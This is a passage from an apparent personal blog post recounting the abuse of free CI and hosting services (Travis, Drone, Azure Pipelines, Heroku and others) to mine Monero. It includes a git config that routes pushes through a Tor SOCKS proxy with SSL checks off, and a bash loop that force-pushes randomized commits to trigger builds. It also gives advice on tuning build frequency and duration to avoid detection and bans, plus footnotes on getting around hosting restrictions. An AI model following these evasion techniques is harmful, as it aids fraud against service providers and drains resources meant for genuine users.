[Bitrise] requires to setup a project, to infer the environment, the target architecture, the execution process and other things, it was very time consuming to setup a build so it got a bad rating in configuration. [Continuousphp], [Buddy], [Codefresh] also had a lot of manual non declarative configuration steps.

Services like [Azure-pipelines], [Wercker], [Buddy] applies shadow-bans on the accounts, shadow-bans are bad, as they leave you guessing if there is something wrong with your configuration or not. With some services you can guess the reason of the ban (pretty much your build took too much time, or you built too many times in a short period), for some others like [Azure-pipelines] I assume they applied some kind of fingerprint to the user repositories as bans were coming through even without any abuse of resources, azure and vercel also restricted `DNS` access within public build machines, so that was additional friction that needed to be overcome with ad-hoc tunnel.

[Drone] gave access to a whole 16+ cores processor but ended up banning after 2 builds [^saddrone]. [Codeship] also gives access to powerful build hosts and didn't ban as aggressively as drone.

My favorite services not because of profitability but for ease and convenience (also with other projects) were [Travis], [Semaphore] and [Docker-hub]. Travis is like the standard CI and is very flexible, Semaphore is the only `DSL` for `CI` that looked approachable and well though instead of just an endless sequence of spaghettified check-boxes like other UIs, and Docker just for the simplicity to map dockerfiles to builds.

### Builds configs

The builds were triggered either by cron jobs offered by web services or by git commits. So you had to keep track of a littering of access tokens or ssh keys to manage all the git commits. It was also important to not over-spam commits, and use proxies when pushing to the repositories configuring git:

```toml
[http]
        proxy = socks5://127.0.0.1:9050
        sslverify = false
[https]
        proxy = socks5://127.0.0.1:9050
        sslverify = false
[url "https://"]
    insteadOf = git://
```

Using git hosting services, github has been the one more thorough about bans, but they were only executed upon abuse reports by ci services admins, gitlab executed a ban wave once, when I tried to renew the CI trial (carelessly). I have never received a ban for a bitbucket account.
To (force) push git commits, we have a long running loop that re-tags the git repository:

```bash
while :; do
    repos_count=$(ls -ld ${repos}/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    for r in $repos/*; do
        cd "$r"
        git fetch --all
        tagger
        echo -e "\e[32m""sleeping for $repos_ival since $(date +%H:%M:%S\ %b/%d)""\e[0m"
        sleep $repos_ival
    done
    sleep 1
done
```

It might be possible that force pushing this way is not something github likes very much and could have been a cause for accounts getting flagged. The tagger function tasked with force pushing a different commits, uses a website (which you can lookup quite easily) that gives some randomized commits. I am not sure how much this helps, since the content itself of the commits is obviously suspicious for my case. And it also bit me in the ass once, since the commits returned by this command can include swear words, one of my commits was picked up by a twitter bot that tracks git commits with swear words! I added a blacklist for bad words after the incident.

I haven't really delved into obfuscated git commits and obfuscated git repositories.
The only instance where I was using a more elaborate repository was with Bitrise since you could not setup a build if the system did not recognize an environment (like mobile apps), but even then there wasn't any rotation and it was always the same repository, quite easy to spot.

Overall, if I had to plot a bell curve around the optimal time to mine _without_ getting accounts banned, across all the tested services, would be with a center around 1 hour build duration, once per day. For cpu cores, apart for a couple out-liars (like drone), most services expect you use the full amount of resources given to you since builds are run inside VMs or containers with constrained resources...and compilation is usually a task that saturates cpu, so it does not have statistical relevance.
Intuitively one build per day is what the average developer would do, so you should expect raised flags if you stray away from the mean, and pushing for abuse never ends well.

## Conclusions

Was it worth it? The networking parts were definitely interesting, dealing with accounts registrations was obviously the worst part, nobodies likes to click endless confirmation emails and repeating mind numbing UI procedures, after all. Writing spam automation software is also boring (because your mostly poking at dumb APIs), and with this assumption (and the fact that this was never anything serious) I never even considered it.
Was it profitable? At its peak it was reaching something like `300$` per month, maybe enough for a venezuelan, not really for me :)

<!-- prettier-ignore-start-->

[^adversary]: _the grumpy sysadmin_
[^infoproc]: even though this would break many privacy assumptions, I am sure most of them just peek inside whenever there is a incumbent problem, but this is only a problem for container based runtimes, whereas VMs are pretty much black boxes.
[^monerominer]: the miner built into the monero node got some work to make it more background friendly, but the distribution of xmrig was never focused on background friendliness.
[^difficulty]: some pools offer different difficulties on different connection ports, and tend to align the job difficulty to the miner submitted shares, but the granularity of the proxy was still more convenient, as it would prevent pool [lock-in] \(although we never really switched pools \).
[^configwatch]: it wasn't happy when the config suddenly appeared and disappeared from the file system
[^stratumprotocol]: We don't talk about the [stratum protocol] since we just have to deal with whatever is implemented in _both_ the pool and the miner...which is usually the bare minimum, and possibly with non standard extensions.
[^fullbash]: never go full bash :\)
[^memoryondemand]: I have not explored what happens when a processes loads additional functionality at runtime, as the kernel would look for the address in the memory layout of the executable, which would access the filesystem and possibly causing a crash.
[^freehostinglimits]: Limits are arbitrary, cpu time is less than a second, memory is less than 128M, outbound connections are blocked.
[^cpanelssh]: with a little bit of patience you can also run a full ssh instance over an environment bootstrapped around your cpanel account space, _without_ having access to the cpanel builtin SSH which tends to be disabled by hosting providers.
[^openshift]: openshift went from a 1 year free tier to 3 months to 1 month, starting to require phone authentication, I can guarantee I was not the only one abusing their services.
[^herokucontainers]: Heroku free tier containers are quite generous in resources, they provide 4c/8t (virtual) cpus, plenty of ram and large storage (which however is not persistent and discarded on dyno shutdown).
[^saddrone]: They adde muc strictier registration rules, after a couple of bans, I might have contributed to it.

[cryptocurrencies]: https://en.wikipedia.org/wiki/Cryptocurrency
[ASICS]: https://en.wikipedia.org/wiki/Application-specific_integrated_circuit
[CPU friendly coins]: \posts/a-few-notes-on-proof-of-work
[miner]: https://github.com/xmrig/xmrig
[another miner]: https://github.com/Bendr0id/xmrigCC
[proxy]: https://github.com/Bendr0id/xmrigcc-proxy
[tunnel]: https://github.com/search?q=tunnel
[somebody]: https://twitter.com/sarahjamielewis
[lost bets]: https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968
[DNS]: https://en.wikipedia.org/wiki/Domain_Name_System
[dos]: https://en.wikipedia.org/wiki/Denial-of-service_attack
[dig]: https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/
[TXT]: https://en.wikipedia.org/wiki/TXT_record
[statically linked]: https://en.wikipedia.org/wiki/Standalone_program
[recommended]: https://www.ietf.org/rfc/rfc6763.txt
[cloudflare]: https://www.cloudflare.com/
[freedns]: https://freedns.afraid.org/
[used to]: https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size
[NULs]: https://en.wikipedia.org/wiki/Null_character
[base64]: https://en.wikipedia.org/wiki/Base64
[curl]: https://curl.se/
[wget]: https://www.gnu.org/software/wget/
[bash]: https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29
[cf cli]: https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md
[trampoline]: https://en.wikipedia.org/wiki/Trampoline_(computing)
[container]: https://en.wikipedia.org/wiki/OS-level_virtualization
[here]: \assets/posts/bash_functions.txt
[IPC]: https://en.wikipedia.org/wiki/Inter-process_communication
[ulimits]: https://web.archive.org/web/https://linux.die.net/man/5/limits.conf
[ipinfo]: https://ipinfo.io/
[geoip.json]: \assets/posts/geoip.json
[technical debt]: https://en.wikipedia.org/wiki/Technical_debt
[state machine]: https://en.wikipedia.org/wiki/Finite-state_machine
[proxychains]: https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains
[forward tunnel]: https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost
[mining proxy]: https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy
[lock-in]: https://en.wikipedia.org/wiki/Vendor_lock-in
[stratum protocol]: https://en.bitcoin.it/wiki/Stratum_mining_protocol
[cdn]: https://en.wikipedia.org/wiki/Content_delivery_network
[aup]: https://en.wikipedia.org/wiki/Acceptable_use_policy
[cpanel]: https://en.wikipedia.org/wiki/CPanel
[cgi]: https://en.wikipedia.org/wiki/Common_Gateway_Interface

[Cloud9]: https://aws.amazon.com/cloud9
[Codeanywhere]: https://web.archive.org/web/20210314172852/https://codeanywhere.com/
[Puppeteer]: https://web.archive.org/web/20210318213139/https://developers.google.com/web/tools/puppeteer
[Openshift]: https://www.openshift.com/
[Heroku]: https://www.heroku.com/
[Bitrise]: https://web.archive.org/web/20210222050951/https://www.bitrise.io/
[Continuousphp]: https://web.archive.org/web/20210310010750/https://continuousphp.com/
[Travis]: https://web.archive.org/web/20210324163536/https://travis-ci.org/
[Semaphore]: https://web.archive.org/web/20210308041527/https://semaphoreci.com/
[Wercker]: https://web.archive.org/web/20210308202144/https://app.wercker.com/
[Buddy]: https://web.archive.org/web/20210322133805/https://buddy.works/
[Drone]: https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome
[Codeship]: https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship
[Docker-hub]: https://web.archive.org/web/20210322105637/https://hub.docker.com/
[Semaphore]: https://web.archive.org/web/20210308041527/https://semaphoreci.com/
[CI]: https://en.wikipedia.org/wiki/Continuous_integration
<!-- prettier-ignore-end-->
